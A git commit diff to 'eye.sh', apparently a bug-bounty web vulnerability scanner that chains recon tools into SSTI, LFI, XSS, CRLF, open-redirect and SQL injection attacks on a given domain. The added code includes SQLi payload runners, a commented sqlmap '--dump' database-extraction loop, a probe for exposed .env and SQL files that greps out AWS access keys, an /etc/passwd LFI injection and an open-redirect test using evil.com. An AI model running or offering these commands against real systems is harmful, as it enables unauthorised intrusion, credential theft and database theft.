791dd235ad73a602306c8816c258e8190285f34c
Eyezik <eyezikbra@gmail.com>
2024-08-05 01:53:36 -0700

    Update eye.sh
    added uro and sqli

--- eye.sh
+++ eye.sh
@@ -30,6 +30,7 @@ help() {
     echo -e "$magenta${BOLD}    --lfi           LFI scan with LFIscanner${NC}"
     echo -e "$magenta${BOLD}    --ssti           SSTI scan with TPLmap${NC}"
     echo -e "$magenta${BOLD}    --csrf           CSRF (crlfuzz)${NC}"
+    echo -e "$magenta${BOLD}    --sqli           Sql Injection${NC}"
     exit 0
 }
 
@@ -41,7 +42,7 @@ domain=$2
 
 
 vuln1() {
-	if [[ ${domain:0:5} == "https" ]]; then
+        if [[ ${domain:0:5} == "https" ]]; then
             domain=${domain:8:${#domain}-8}
     elif [[ ${domain:0:4} == "http" ]]; then
             domain=${domain:7:${domain}-7}
@@ -72,13 +73,16 @@ vuln1() {
             trap : SIGINT
             waymore -i $domain -oU output/$domain/raw_urls.txt
     fi
-    
+
     echo $2
     echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
+    cat output/$domain/raw_urls.txt | uro > output/$domain/raw_tmp.txt 
+    rm output/$domain/raw_urls.txt
+    mv output/$domain/raw_tmp.txt output/$domain/raw_urls.txt ## yeah i could have done it better, but it works.
     cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
     cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
-    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt 
-    cat output/$domain/raw_urls.txt | gf sqli > output/$domain/sqli.txt
+    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt
+    cat output/$domain/raw_urls.txt | gf sqli |uro | gxss |anew output/$domain/sqli.txt
     cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
     cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
     cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
@@ -115,13 +119,17 @@ vuln2() {
 }
 
 vuln3() {
-	echo -e "$RED${BOLD} --- $green${BOLD}Custom Exploitation Scanning $RED${BOLD}--- ${NC} \n"
+        echo -e "$RED${BOLD} --- $green${BOLD}Custom Exploitation Scanning $RED${BOLD}--- ${NC} \n"
     echo -e "$yellow${BOLD} \n [!] SSTI Scan: \n$CYAN"
     for url in $(cat output/$domain/gxss_dump.txt); do python3.9 tools/tplmap/tplmap.py -u $url; anew output/$domain/VULN_ssti; done
     [ -s output/$domain/VULN_ssti.txt ] && echo -e "$green${BOLD} [+] FOUND VULN SSTI [+] Check output/$domain/VULN_ssti.txt for output ${NC}" || echo -e "$RED [+] No SSTI Found[+] ${NC}"
-    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file 
+    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file
     for url in $(cat output/$domain/lfi_qsr.txt); do python3 tools/LFIscanner/LFIscanner.py -t $url -p tools/LFIscanner/payloads.txt; print $url; anew output/$domain/VULN_lfi; done
-
+    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
+    #cat output/$domain/sqli.txt
+    #python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
+    for url in $(cat output/$domain/sqli.txt); do python3 tools/ScanQLi/scanqli.py -u $url -o output/$domain/VULN_sqli; print $url; anew output/$domain/VULN_sqli; done
+    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
     #for url in $(cat output/$domain/ssti.txt); do python3.9 tools/tplmap/tplmap.py -u $url; print $url; done #if error make sure to not use python 3.11 or above #another fix for tplmap: https://github.com/epinna/tplmap/issues/118
     echo -e "$green${BOLD} \n [!] XSS Scan: \n${NC}"
     cat output/$domain/gxss_dump.txt | dalfox pipe | anew output/$domain/VULN_xss.txt
@@ -129,7 +137,7 @@ vuln3() {
     echo -e "$CYAN${BOLD} \n [!] CSRF Scan: \n${NC}"
     crlfuzz -l output/$domain/subs_alive.txt -o output/$domain/VULN_csrf.txt
     [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] FOUND VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
-
+    cat output/$domain/subs.txt | httpx -silent -path ".env",".mysql_history","echo $(echo $(</dev/stdin) | cut -d "." -f2).sql" -mc 200 -ports 80,443,8080,8443 | grep -E -i "AKIA[A-Z0-9]{16}" | anew output/$domain/VULN_keys.txt
     cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"' | anew VULN_lfi.txt
     cat output/$domain/redirect.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host $green${BOLD} Open Redir. Vulnerable\n" ;done
     cat output/$domain/sqli.txt | parallel -j 50 'ghauri -u '{}' --dbs --hostname --confirm --batch' | anew output/$domain/VULN_sqli.txt
@@ -146,7 +154,7 @@ ssti() {
 
 }
 lfi() {
-    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file 
+    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file
     for url in $(cat output/$domain/lfi_qsr.txt); do python3 tools/LFIscanner/LFIscanner.py -t $url -p tools/LFIscanner/payloads.txt; print $url; anew output/$domain/VULN_lfi; done
 }
 csrf() {
@@ -154,20 +162,45 @@ csrf() {
     crlfuzz -l output/$domain/subs_alive.txt -o output/$domain/VULN_csrf.txt
     [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] FOUND VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
 }
+dbinj() { # ignore
+    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
+    cat output/$domain/sqli.txt
+    python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
+    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
+}
+dbinj2() { ## can ignore 
+    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
+    #cat output/$domain/sqli.txt
+    #python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
+    for url in $(cat output/$domain/sqli.txt); do python3 tools/ScanQLi/scanqli.py -u $url -o output/$domain/VULN_sqli; print $url; anew output/$domain/VULN_sqli; done
+    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
+}
+sqli() {
+    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
+    #cat output/$domain/sqli.txt
+    python3 tools/SqliSniper/sqlisniper.py --payload tools/SqliSniper/payloads.txt --headers tools/SqliSniper/headers.txt -r output/$domain/sqli.txt | anew output/$domain/VULN_sqli
+    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
+    ##run sqlmap here? sure
+    #for url in $(cat output/$domain/VULN_sqli.txt); do sqlmap -u $url --batch --level=3 --risk=3 --dump; print $url; anew output/$domain/Database_dump.txt; done
+}
 if [ "$1" == "--scan" ]; then
     vuln1
 elif [ "$1" == "--exploit" ]; then
     vuln2
-elif [ "$1" == "--custom" ]; then
-    vuln3
 elif [ "$1" == "--xss" ]; then
     xss
 elif [ "$1" == "--ssti" ]; then
     ssti
+elif [ "$1" == "--sqli" ]; then
+    sqli
 elif [ "$1" == "--lfi" ]; then
     lfi
 elif [ "$1" == "--csrf" ]; then
     csrf
+elif [ "$1" == "--database" ]; then
+    dbinj
+elif [ "$1" == "--database2" ]; then
+    dbinj2
 else
     echo -e "${RED}Unknown option: $1 ${NC}"
     help
